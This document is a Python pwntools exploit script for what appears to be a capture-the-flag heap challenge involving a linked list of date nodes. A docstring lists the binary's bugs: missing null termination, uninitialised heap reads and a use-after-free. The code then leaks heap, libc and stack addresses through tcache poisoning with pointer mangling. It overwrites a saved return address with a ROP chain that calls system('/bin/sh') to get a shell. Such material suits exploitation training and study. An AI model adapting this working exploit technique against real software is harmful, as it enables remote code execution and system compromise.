#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('prob_patched')
libc = exe.libc
# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("172.17.0.2", 1234)
        time.sleep(1)
        pid = process(["pidof", "prob"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


"""
00000000 struct chunk_t // sizeof=0x40
00000000 {
00000000     int year;
00000004     int month;
00000008     int day;
0000000C     int hour;
00000010     char name[32];
00000030     struct chunk_t *next;
00000038     struct chunk_t *prev;
00000040 };


add_node:
    - Allocates memory for the node
    - Nulls out the next and prev points of the chunk
    - If a root node exists, it updates the current_node->next to our allocated memory
    - And then it updates the node's back pointer to the current_node
    - If the root node does not exists then it sets the root node the allocated memory
    - Then finally current_node is updated to the current memory
    - Essentially this makes sure that our allocated node prev pointer points to the previously allocated node and the previously allocated node next pointer points to our allocated node
    - There's no null termination done on name

delete_node:
    - It defines a char variable of 40 bytes called name on the stack, but only the first 32 bytes are null terminated, then it reads in from stdin at most 32 bytes into the buffer
    - Based on the provided node name, it would iterate through all the nodes, then calls an implementation of a strcmp like function with the provided name and node->name
    - If the node exists there are various checks that are used to determine how it fixes up the linked list
        - Case 1: if node->prev and node->next isn't null (this means that the chunk is in between two nodes in the list) and if this is the case, it updates node->prev->next to node->next and node->next->prev to node->prev (essentially unlinking it from the list of nodes)
        - Case 2: if node is the current node (this means this is the last node in the list) and node->prev isn't null, it updates current_node to node->prev, else this means this is the only node present (the root node) then it sets root_node and current_node to 0
        - Case 3: if node is the root node and node->next isn't null, it updates root_node to node->next then node->next->prev to 0 else this means this is the only allocated memory hence it sets root_node and current_node to 0
    - After the whole process is done, it free's node (but even if it does find a node that doesn't meet this condition it still free's it )
    
modify_node:
    - It defines a char variable of 40 bytes called name on the stack, but only the first 32 bytes are null terminated, then it reads in from stdin at most 32 bytes into the buffer
    - Based on the provided node name, it would iterate through all the nodes, then calls an implementation of a strcmp like function with the provided name and node->name
    - The way strcmp_wrapper works is by checking every character in the name (str) while not null and comparing that with the character matching the current position of node->name (haystack), if it matches an increment is done on both pointers
    - Once the loop condition breaks (if any of the condition isn't satisfied), it subtracts the byte at the str pointer with that of haystack (if it's equal to zero then this means it found the right node and that's what is returned)
    - The problem is this is that, during a node initialization, name isn't null terminated so if we full up the buffer it's basically comparing str[32] and haystack[32], where haystack points to the lsb of node->next (if it exists else null) and str the lsb of some uninitialized variable on the stack?
    
view_node:
    - For every available nodes, it prints out the details of each field in the structure
    - During the printing of node->name, since no null termination, we can leak the address of node->next
    - But this isn't the only way we can leak an heap address, it uses scanf to read our input, and the memory allocated by malloc, it only clears chunk->tcache_key, so basically if we can make scanf not overwrite the memory we can read chunk->fd

Vulnerability Discovered:
    - No null termination
    - No scanf check hence we can read uninitialized variables on the heap
    - During the unlinking of a node, for case 2, after it verifies that node->prev isn't null it updates current_node to node->prev, but it doesn't set node->prev->next to 0 hence this causes a UAF
"""

heap_base = 0

def init():
    global io
    io = start()


def add_node(name, year=1337, month=1337, day=1337, hour=1337, keep=False):
    io.sendlineafter(b">>", b"1")
    io.sendafter(b":", name)
    if keep:
        io.sendlineafter(b":", b"+")
        io.sendlineafter(b":", b"+")
        io.sendlineafter(b":", b"+")
        io.sendlineafter(b":", b"+")
    else:
        io.sendlineafter(b":", str(year).encode())
        io.sendlineafter(b":", str(month).encode())
        io.sendlineafter(b":", str(day).encode())
        io.sendlineafter(b":", str(hour).encode())

def delete_node(name):
    io.sendlineafter(b">>", b"2")
    io.sendafter(b":", name)

def modify_node(name, new_name, year, month, day, hour):
    io.sendlineafter(b">>", b"3")
    io.sendafter(b":", name)
    io.sendafter(b":", new_name)
    io.sendlineafter(b":", str(year).encode())
    io.sendlineafter(b":", str(month).encode())
    io.sendlineafter(b":", str(day).encode())
    io.sendlineafter(b":", str(hour).encode())

def view_nodes(ru):
    io.sendlineafter(b">>", b"4")
    io.recvuntil(ru)
    io.recvuntil(b"Year : ")
    data = io.recvlines(2)
    upper = int(data[1].split(b" ")[-1]) & 0xffffffff
    lower = int(data[0]) & 0xffffffff
    chunk = upper << 32 | lower
    return chunk

def leak_stack(ru):
    io.sendlineafter(b">>", b"4")
    io.recvuntil(ru)
    data = u64(io.recv(6).ljust(8, b"\x00"))
    return data

def pack_ptr(addr):
    lower = addr & 0xffffffff
    upper = (addr >> 32)
    return lower, upper

def calc_addr(offset):
    return heap_base + offset

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val  


def solve():

    global heap_base

    add_node(b"A"*0x8)
    add_node(b"B"*0x8)
    add_node(b"C"*0x8)

    delete_node(b"C"*8)
    add_node(b"C"*0x8, keep=True)

    heap_base = view_nodes(b"C"*8) << 12
    info("heap base: %#x", heap_base)

    # tcache dup
    delete_node(b"C"*8)
    modify_node(b"C"*8, b"C"*8, 0xdeadbeef, 0x0, 1337, 1337)
    delete_node(b"C"*8)

    target_chunk = calc_addr(0x320)
    list_next = calc_addr(0x340)
    list_prev = calc_addr(0x2a0)
    mangled_ptr = mangle(heap_base, target_chunk)
    
    l1, u1 = pack_ptr(mangled_ptr)
    l2, u2 = pack_ptr(list_next)
    l3, u3 = pack_ptr(list_prev)
    
    modify_node(b"C"*8, b"C"*8, l1, u1, 1337, 1337)

    add_node(b"C"*8)
    add_node(p64(0) + p64(0x91), l2, u2, l3, u3)

    delete_node(b"\x00")
    add_node(b"D"*8)
    
    list_next = calc_addr(0x390)
    list_prev = calc_addr(0x2a0)
    l1, u1 = pack_ptr(list_next)
    l2, u2 = pack_ptr(list_prev)

    modify_node(b"\x00"*8, b"\x00"*8 + p64(0x51), l1, u1, l2, u2) # fix node->next & node->prev
    delete_node(b"D"*8)
    modify_node(b"D"*8, b"D"*8, 0xdeadbeef, 0x0, 1337, 1337)
    delete_node(b"D"*8)

    tcache_per_thread = calc_addr(0x10)
    mangled_ptr = mangle(heap_base, tcache_per_thread)

    l1, u1 = pack_ptr(mangled_ptr)

    modify_node(b"D"*8, b"D"*8, l1, u1, 1337, 1337)
    add_node(b"D"*8)
    add_node(b"\x00", 0, 0, 0, 0x70000) # fill tcache count for idx [7] to max
    
    # tcache dup to clear node->prev in tcache_per_thread struct
    add_node(b"E"*8)
    add_node(b"F"*8)
    add_node(b"G"*7 + b"\x00" + p64(0xdeadbeef) * 2 + p64(0x21), 1, 2, 3, 4)

    target = calc_addr(0x3c0)
    list_next = calc_addr(0x3e0)
    list_prev = calc_addr(0x2f0)
    mangled_ptr = mangle(heap_base, target)

    l1, u1 = pack_ptr(mangled_ptr)
    l2, u2 = pack_ptr(list_next)
    l3, u3 = pack_ptr(list_prev)

    delete_node(b"G"*7)
    modify_node(b"G"*7, b"G"*7, 1, 2, 3, 4)
    delete_node(b"G"*7)

    modify_node(b"G"*7, b"G"*7, l1, u1, 1337, 1337)
    add_node(b"G")
    add_node(p64(0) + p64(0x91), l2, u2, l3, u3)
    add_node(b"I"*8)

    delete_node(b"I"*8)
    modify_node(b"I"*8, b"I"*8, 1, 2, 3, 4)
    delete_node(b"I"*8)

    target = calc_addr(0x460)
    list_next = calc_addr(0x4d0)
    list_prev = 0x41
    mangled_ptr = mangle(heap_base, target)

    l1, u1 = pack_ptr(mangled_ptr)
    l2, u2 = pack_ptr(list_next)
    l3, u3 = pack_ptr(list_prev)

    modify_node(b"I"*8, b"I"*8, l1, u1, 1337, 1337)
    add_node(b"I")
    add_node(b"A"*8, l2, u2, l3, u3)

    """
    tcache dup to clear out node[4]->next and node[4]->prev, so it doesn't break unlink code in glibc
    """

    target = calc_addr(0x400)
    mangled_ptr = mangle(heap_base, target)

    l1, u1 = pack_ptr(mangled_ptr)

    delete_node(b"I"*8)
    modify_node(b"I"*8, b"I"*8, 1, 2, 3, 4)
    delete_node(b"I"*8)
    modify_node(b"I"*8, b"I"*8, l1, u1, 0, 0)

    add_node(b"done")
    add_node(p64(0) * 2, 0, 0, 0, 0)
    modify_node(p64(heap_base + 0x460), p64(0xdeadbeef) * 2, 1, 2, 3, 4)
    delete_node(p64(0xdeadbeef))

    add_node(b"libc!!\x00", keep=True)
    main_arena = view_nodes(b"libc!!")
    libc.address = main_arena - 0x203ba0
    info("libc base: %#x", libc.address)

    # first clear all nodes!
    delete_node(b"A"*8)
    delete_node(b"B"*8)
    delete_node(b"D"*8)
    delete_node(b"libc!!\x00")

    """
    Now we have libc & heap leak, leak stack from environ in libc
    """

    add_node(b"X"*0x8 + b"\x00")
    add_node(b"Y"*0x8 + b"\x00")
    add_node(b"Z"*0x8)

    delete_node(b"Z"*8)

    environ = libc.sym["environ"] - 0x18
    mangled_ptr = mangle(heap_base, environ)
    l1, u1 = pack_ptr(mangled_ptr)

    modify_node(b"Z"*8, b"Z"*8, l1, u1, 1337, 1337)
    add_node(b"Z"*8)
    add_node(b"stack!!!", keep=True)
    stack = leak_stack(b"stack!!!")

    # we don't want to call new malloc else it's gonna attempt to allocate from unsorted bin thereby crashing since it's corrupted, so we free the root_node and allocate again 
    delete_node(b"X"*8)
    delete_node(b"Y"*8)
    add_node(b"X"*8)
    add_node(b"Y"*8)

    """
    Overlapping chunk to add_node return address!
    """

    delete_node(b"Y"*8)
    modify_node(b"Y"*8, b"Y"*8, 1, 2, 3, 4)
    delete_node(b"Y"*8)

    stack = stack - 0x158
    mangled_ptr = mangle(heap_base, stack)
    l1, u1 = pack_ptr(mangled_ptr)
    info("saved rip: %#x", stack)

    modify_node(b"Y"*8, b"Y"*8, l1, u1, 1337, 1337)
    add_node(b"Y"*8)

    pop_rdi = libc.address + 0x2a873 # pop rdi ; pop rbp ; ret
    pop_rsi = libc.address + 0x110a7d
    sh = next(libc.search(b"/bin/sh\x00"))
    ret = pop_rdi + 1
    system = libc.sym["system"]

    l1, u1 = pack_ptr(pop_rdi)

    pause()
    add_node(
        flat(
            [   
                sh,
                0x0,
                libc.sym["system"]
            ]
        ),
        1337, 1337,
        l1, u1
    )

    io.interactive()



def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

